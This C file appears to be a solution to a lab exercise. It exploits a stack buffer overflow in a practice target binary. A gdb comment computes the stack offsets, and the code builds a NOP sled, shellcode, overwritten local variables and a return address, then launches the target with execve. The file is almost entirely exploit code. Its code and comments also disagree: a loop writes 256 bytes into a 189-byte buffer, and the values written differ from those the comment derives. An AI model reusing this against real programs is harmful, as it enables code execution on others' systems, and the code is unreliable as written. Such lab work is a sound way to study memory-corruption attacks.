#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*
(gdb) info frame
  Stack level 0, frame at 0x3021feb0:
  rip = 0x400b85 in foo (target4.c:14); saved rip = 0x400c62
  called by frame at 0x3021fed0
  source language c.
  Arglist at 0x3021fea0, args: arg=0x7fffffffd7b2 "test"
  Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
  Saved registers:
  rbp at 0x3021fea0, rip at 0x3021fea8

(gdb) p &buf
  $1 = (char (*)[156]) 0x3021fdf0
(gdb) p &len
  $3 = (int *) 0x3021fe9c
(gdb) p &i
  $4 = (int *) 0x3021fe98

the distance between buf & rip: 0x3021fea8 - 0x3021fdf0 = 184 bytes
the distance between buf & len: 0x3021fe9c - 0x3021fdf0 = 172 bytes
the distance between buf & i: 0x3021fe98 - 0x3021fdf0 = 168 bytes

we need to write return value in buf[184]~buf[187], which is 16 bytes after i
so we need to modify i to 148 and len to 169
*/
int main(void)
{
  char *args[3];
  char *env[6];

  char buf[189];

  for(int i = 0; i < 256; i++){
    buf[i] = 0x90;
  }
  for(int i = 0; i < 45; i++){
    buf[i] = shellcode[i];
  }

  buf[168] = 0x47; //modify i to 71
  buf[169] = 0x00; //need to use env
  buf[170] = 0x00;
  buf[171] = 0x00;

  buf[172] = 0x5a;//modify len 89
  buf[173] = 0x00;
  buf[174] = 0x00;
  buf[175] = 0x00;

  //return address to i
  buf[184] = 0xf0;
  buf[185] = 0xfd;
  buf[186] = 0x21;
  buf[187] = 0x30;
  buf[188] = 0x00;
  // printf("%d", strlen(buf));

  env[0] = ""; //buf[170]
  env[1] = ""; //buf[171]
  env[2] = &buf[172];
  env[3] = ""; //buf[174]
  env[4] = ""; //buf[175]
  env[5] = &buf[176];

//  printf("%d", strlen(buf));
  // for(int i = 0; i <= strlen(buf); i++){
  //   printf("\'\\x%x\',", (unsigned char)buf[i]);
  // }
  // for(int i = 0; i < 6; i++){
  //   for(int j = 0; j <= strlen(env[i]); j++)
  //     printf("\'\\x%x\',", (unsigned char)env[i][j]);
  // }

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}